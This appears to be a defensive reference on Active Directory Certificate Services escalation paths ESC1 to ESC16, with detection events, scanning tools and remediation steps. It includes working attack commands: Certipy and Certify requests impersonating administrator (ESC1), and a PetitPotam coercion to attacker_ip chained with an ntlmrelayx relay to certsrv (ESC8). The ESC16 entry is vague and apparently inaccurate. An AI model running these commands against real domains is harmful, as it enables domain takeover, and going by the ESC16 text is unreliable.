# AD CS Vulnerability Reference (ESC1-ESC16)

Comprehensive documentation of Active Directory Certificate Services attack paths, detection methods, and remediation steps.

---

## ESC1 -- Misconfigured Certificate Templates (SAN Abuse)

**Severity:** Critical

**Condition:** A certificate template allows:
1. Enrollee supplies Subject Alternative Name (SAN) -- `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag set
2. Low-privileged users have Enrollment rights
3. Template has Client Authentication (or any EKU that enables authentication)
4. No manager approval required

**Exploitation:**
```bash
# Using Certipy
certipy req -u lowpriv@example.com -p 'Password' -ca 'CORP-CA' \
    -template 'VulnerableTemplate' -upn 'administrator@example.com'

# Using Certify
Certify.exe request /ca:CA01.example.com\CORP-CA /template:VulnerableTemplate \
    /altname:administrator
```

The attacker requests a certificate with the administrator's UPN in the SAN field. The CA issues it. The attacker uses it for Kerberos PKINIT authentication as the administrator.

**Detection:**
- Event ID 4887 (certificate issued) -- Check for certificates where the SAN does not match the requester
- Monitor for Certify/Certipy execution (process creation, command-line logging)
- Audit template configurations with `Certify.exe find /vulnerable` or `certipy find`

**Remediation:**
1. Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag from template
2. If SAN is required: enable CA Manager Approval (`CT_FLAG_PEND_ALL_REQUESTS`)
3. Restrict enrollment permissions to only required groups
4. Enable certificate request auditing (Event 4886/4887)

---

## ESC2 -- Misconfigured Certificate Templates (Any Purpose / No EKU)

**Severity:** Critical

**Condition:** A certificate template has:
1. EKU set to "Any Purpose" (`2.5.29.37.0`) or no EKU at all
2. Low-privileged users have Enrollment rights

**Exploitation:** A certificate with "Any Purpose" EKU can be used for client authentication, code signing, or any other purpose. An attacker enrolls and uses the certificate for PKINIT authentication. No EKU certificates are also treated as valid for any purpose by many implementations.

**Remediation:**
1. Set specific EKU on the template (e.g., Client Authentication only)
2. Remove "Any Purpose" OID
3. Restrict enrollment permissions

---

## ESC3 -- Enrollment Agent Abuse

**Severity:** High

**Condition:**
1. Template A has "Certificate Request Agent" EKU and low-privileged enrollment
2. Template B allows enrollment on behalf of others (enrollment agent) and has Client Auth EKU
3. No restrictions on which enrollment agents can enroll for which users

**Exploitation:**
1. Attacker enrolls in Template A to get an enrollment agent certificate
2. Attacker uses enrollment agent certificate to request a certificate from Template B on behalf of a privileged user

**Remediation:**
1. Restrict enrollment permissions on enrollment agent templates
2. Configure "Restrict Enrollment Agents" on the CA -- limit which enrollment agents can enroll for which templates and which users
3. Enable manager approval on templates that allow enrollment on behalf

```powershell
# Configure enrollment agent restrictions on CA
# CA Properties > Enrollment Agents tab
# Restrict by: enrollment agent certificate, certificate template, and target user/group
```

---

## ESC4 -- Vulnerable Certificate Template ACLs

**Severity:** Critical

**Condition:** Low-privileged users have Write permissions on a certificate template object in AD (e.g., `WriteDacl`, `WriteOwner`, `GenericAll`, `GenericWrite`, `WritePKI` properties)

**Exploitation:**
1. Attacker modifies the template to enable ESC1 conditions (add `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, change EKU to Client Auth, enable auto-enrollment)
2. Attacker exploits the modified template as ESC1
3. Optionally, attacker reverts the template to cover tracks

**Detection:**
- Event ID 4899 (certificate template updated)
- Monitor ACLs on certificate template objects in AD
- Regular template audits with Certify/Certipy

**Remediation:**
1. Audit and fix template ACLs: remove Write permissions for non-admin groups
2. Only `Enterprise Admins` and `Domain Admins` should have Write on templates
3. Monitor Event 4899 for unauthorized template modifications

---

## ESC5 -- Vulnerable PKI AD Object ACLs

**Severity:** High

**Condition:** Low-privileged users have Write permissions on PKI-related AD objects:
- CA computer object
- CA's RPC/DCOM server
- CN=Public Key Services container or child objects in CN=Configuration
- CN=NTAuthCertificates object

**Exploitation:** Attacker modifies PKI AD objects to enable certificate-based attacks. For example, adding a rogue CA certificate to NTAuthCertificates enables trust of certificates issued by an attacker-controlled CA.

**Remediation:**
1. Audit ACLs on all objects under `CN=Public Key Services,CN=Services,CN=Configuration`
2. Restrict Write permissions to PKI administrators only
3. Monitor changes to the NTAuthCertificates object

---

## ESC6 -- EDITF_ATTRIBUTESUBJECTALTNAME2

**Severity:** Critical

**Condition:** The CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled, which allows ANY certificate request to specify a SAN regardless of template settings.

**Detection:**
```powershell
# Check if flag is enabled
certutil -config "CA01\CORP-CA" -getreg policy\EditFlags
# Look for EDITF_ATTRIBUTESUBJECTALTNAME2 (0x00040000)
```

**Exploitation:** Even templates without `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` accept SAN values in the request when this flag is enabled on the CA.

**Remediation:**
```powershell
# Disable the flag
certutil -config "CA01\CORP-CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
# Restart CA service
Restart-Service certsvc
```

---

## ESC7 -- Vulnerable CA ACLs

**Severity:** Critical

**Condition:** Low-privileged users have dangerous permissions on the CA itself:
- `ManageCA` -- Can modify CA configuration
- `ManageCertificates` -- Can approve pending certificate requests

**Exploitation (ManageCA):**
1. Attacker uses ManageCA permission to enable `EDITF_ATTRIBUTESUBJECTALTNAME2` (creates ESC6)
2. Or adds themselves as an officer to approve requests

**Exploitation (ManageCertificates):**
1. Attacker submits a request to a template requiring manager approval
2. Attacker approves their own request using ManageCertificates permission

**Remediation:**
1. Audit CA ACLs: `certutil -config "CA01\CORP-CA" -getacl`
2. Remove ManageCA and ManageCertificates from non-admin groups
3. Only PKI Admins should have CA management permissions

---

## ESC8 -- NTLM Relay to AD CS HTTP Endpoints

**Severity:** Critical

**Condition:** Certificate enrollment web endpoints (certsrv, CES) are accessible via HTTP (not HTTPS only) and do not enforce Extended Protection for Authentication (EPA).

**Exploitation:**
1. Attacker coerces a machine account to authenticate (PetitPotam, PrinterBug, DFSCoerce)
2. Attacker relays the NTLM authentication to the CA's HTTP enrollment endpoint
3. Attacker enrolls a certificate as the machine account (e.g., a domain controller)
4. Attacker uses the DC certificate for PKINIT authentication as the DC

```bash
# Coerce authentication (PetitPotam)
python3 PetitPotam.py -d example.com -u user -p pass attacker_ip dc_ip

# Relay to web enrollment
ntlmrelayx.py -t http://ca.example.com/certsrv/certfnsh.asp \
    -smb2support --adcs --template DomainController
```

**Remediation:**
1. Disable HTTP enrollment endpoints -- use HTTPS only
2. Enable Extended Protection for Authentication (EPA) on IIS
3. Disable NTLM authentication on the CA web enrollment site
4. Better: disable web enrollment entirely if not needed (use auto-enrollment instead)
5. Mitigate coercion: disable the Print Spooler service on DCs, patch PetitPotam (CVE-2021-36942)

---

## ESC9 -- CT_FLAG_NO_SECURITY_EXTENSION

**Severity:** High

**Condition:** Template has `CT_FLAG_NO_SECURITY_EXTENSION` flag set (`msPKI-Enrollment-Flag` bit 0x00080000). This prevents the `szOID_NTDS_CA_SECURITY_EXT` extension from being embedded in the certificate.

**Impact:** Without the security extension, the certificate does not contain the mapping information needed for strong certificate mapping (KB5014754). This allows an attacker who can modify a user's `userPrincipalName` or `dNSHostName` to obtain a certificate that maps to a different account.

**Remediation:**
1. Remove `CT_FLAG_NO_SECURITY_EXTENSION` from template enrollment flags
2. Enforce strong certificate mapping (compatibility mode ends with future Windows updates)

---

## ESC10 -- Weak Certificate Mapping

**Severity:** High

**Condition:** Domain controllers use weak certificate mapping:
- Registry: `HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement = 0` (disabled)
- Or `CertificateMappingMethods` includes weak methods (0x0004 UPN mapping, 0x0008 S4U2Self)

**Exploitation:** Attacker obtains a certificate for one account and uses weak mapping to authenticate as another account. Combined with the ability to modify UPN or DNS attributes.

**Remediation:**
1. Set `StrongCertificateBindingEnforcement = 2` (full enforcement mode)
2. Remove weak certificate mapping methods
3. Deploy KB5014754 compatibility mode, then move to enforcement mode

---

## ESC11 -- NTLM Relay to AD CS ICPR (RPC)

**Severity:** High

**Condition:** The CA's RPC interface (ICertPassage Remote, MS-ICPR) does not enforce signing, allowing NTLM relay.

**Exploitation:** Similar to ESC8 but relays to the RPC enrollment interface instead of HTTP.

**Detection:** Check if the CA enforces RPC signing:
```powershell
certutil -config "CA01\CORP-CA" -getreg CA\InterfaceFlags
# Check for IF_ENFORCEENCRYPTICERTREQUEST (0x00000200)
```

**Remediation:**
```powershell
# Enable RPC signing enforcement
certutil -config "CA01\CORP-CA" -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
Restart-Service certsvc
```

---

## ESC12 -- CA Using YubiHSM with Shell Access

**Severity:** Medium

**Condition:** CA uses a YubiHSM hardware security module, and the authentication key is stored in plaintext in the registry.

**Exploitation:** Attacker with local admin on the CA reads the YubiHSM authentication key from `HKLM\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` and uses it to operate the HSM directly.

**Remediation:**
1. Restrict local admin access to CA servers (Tier 0)
2. Use YubiHSM's authentication key encryption features
3. Monitor registry access on the CA

---

## ESC13 -- Issuance Policy OID Group Link

**Severity:** High

**Condition:** A certificate template is configured with an issuance policy that has an OID group link (`msDS-OIDToGroupLink`) pointing to a group. Enrolling in the template effectively grants membership in the linked group.

**Exploitation:** Attacker enrolls in the template and obtains an authentication certificate. When authenticating, the issuance policy OID maps to the linked group, granting the attacker the group's permissions.

**Remediation:**
1. Audit `msDS-OIDToGroupLink` on all OID objects in `CN=OID,CN=Public Key Services,CN=Services,CN=Configuration`
2. Remove unnecessary OID-to-group links
3. Restrict enrollment on templates with issuance policies that have group links

---

## ESC14 -- Weak Explicit Certificate Mapping

**Severity:** High

**Condition:** An attacker has Write access to a user's `altSecurityIdentities` attribute (or other attributes used for certificate mapping) and can modify it to map a certificate they control to the target account.

**Remediation:**
1. Audit Write permissions on `altSecurityIdentities` attribute
2. Enforce strong certificate mapping (full enforcement, not compatibility mode)
3. Monitor changes to `altSecurityIdentities` via SACL auditing

---

## ESC15 -- Application Policy with EKU in Schema v1 Templates

**Severity:** Medium

**Condition:** Schema version 1 certificate templates use the Application Policy extension (instead of EKU) to specify allowed uses. Some implementations do not properly validate Application Policy, allowing abuse.

**Remediation:**
1. Upgrade schema v1 templates to schema v2 or later
2. Ensure EKU (not just Application Policy) is properly configured
3. Test certificate validation behavior in your environment

---

## ESC16 -- Extended Schema v1 Issues

**Severity:** Medium

**Condition:** Similar to ESC15, additional schema v1 template interpretation issues across different Windows versions and certificate validation implementations.

**Remediation:**
1. Migrate all templates from schema v1 to v2+
2. Audit certificate validation across all relying parties
3. Apply latest Windows security updates (KB5014754 and related)

---

## Comprehensive Detection Strategy

### Proactive Scanning

Run these tools regularly (monthly minimum):

```bash
# Certipy -- comprehensive AD CS audit
certipy find -u auditor@example.com -p 'AuditPass' -dc-ip 10.0.0.1 -vulnerable -stdout

# Certify -- Windows-native C# tool
Certify.exe find /vulnerable /currentuser

# Locksmith (PowerShell)
Import-Module Locksmith
Invoke-Locksmith -Mode 2  # Full audit with remediation steps
```

### Event-Based Detection

| Event | Monitor For |
|---|---|
| 4886 + 4887 | Unusual certificate requests (unexpected templates, unexpected requesters) |
| 4887 + SAN mismatch | Certificate issued where SAN does not match requester identity |
| 4899 | Template modifications (especially enrollment flags, subject name flags) |
| CA audit logs | ManageCA or ManageCertificates operations by non-PKI admins |
| Directory Service changes | Modifications to `CN=Public Key Services` objects |

### Continuous Monitoring

- Integrate AD CS events into SIEM (Splunk, Sentinel, etc.)
- Create alerts for ESC1/ESC4/ESC6/ESC7/ESC8 indicators
- Track new certificate template publications
- Monitor for coercion attacks (PetitPotam, PrinterBug) as ESC8 precursors
